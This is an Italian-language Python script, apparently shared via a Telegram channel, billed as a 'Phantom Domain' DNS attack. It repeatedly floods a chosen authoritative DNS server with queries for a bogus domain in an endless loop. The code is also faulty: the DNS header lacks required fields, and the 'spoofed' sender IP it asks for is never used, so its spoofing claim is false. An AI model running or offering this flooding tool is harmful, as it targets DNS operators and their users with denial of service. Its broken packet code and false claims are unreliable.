print("\033[1;31m┈┈┈╲┈┈┈┈╱")
print("┈┈┈╱▔▔▔▔╲")
print("┈┈┃┈▇┈┈▇┈┃")
print("╭╮┣━━━━━━┫╭╮")
print("┃┃┃┈┈┈┈┈┈┃┃┃")
print("╰╯┃┈┈┈┈┈┈┃╰╯")
print("┈┈╰┓┏━━┓┏╯")
print("┈┈┈╰╯┈┈╰╯\033[0m")

import socket
import random
import time

def invia_pacchetto_dns(destinazione, porta, dominio, mittente, count):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        payload = create_dns_query(dominio, mittente)
        sock.sendto(payload, (destinazione, porta))
        print("\033[1;32mRichiesta DNS inviata con successo a {}\033[0m".format(destinazione))
        if count % 50 == 0:
            print("\033[1;34m----> 50 richieste DNS inviate <----\033[0m")
    except Exception as e:
        print("\033[1;31mErrore durante l'invio della richiesta DNS a {}: {}\033[0m".format(destinazione, e))
    finally:
        sock.close()

def create_dns_query(dominio, mittente):
    transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
    flags = b'\x01\x00'  
    qdcount = b'\x00\x01'  
    payload = transaction_id + flags + qdcount
    
    
    labels = dominio.split('.')
    for label in labels:
        payload += bytes([len(label)]) + label.encode('utf-8')
    payload += b'\x00'  
    payload += b'\x00\x01'  
    payload += b'\x00\x01'  
    
    return payload

print("\033[1;32mAttacco Phantom Domain DNS by \nt.me/VikingTERMINAL\033[0m")
destinazione = input("\033[1;35mInserisci l'indirizzo IP del server DNS autoritativo: \033[0m")
porta = 53
dominio = input("\033[1;35mInserisci il dominio fasullo da richiedere: \033[0m")
mittente = input("\033[1;35mInserisci l'indirizzo IP falsificato del mittente: \033[0m")
intervallo = float(input("\033[1;35mInserisci l'intervallo tra le richieste DNS (in secondi): \033[0m"))
count = 0

while True:
    invia_pacchetto_dns(destinazione, porta, dominio, mittente, count)
    count += 1
    time.sleep(intervallo)
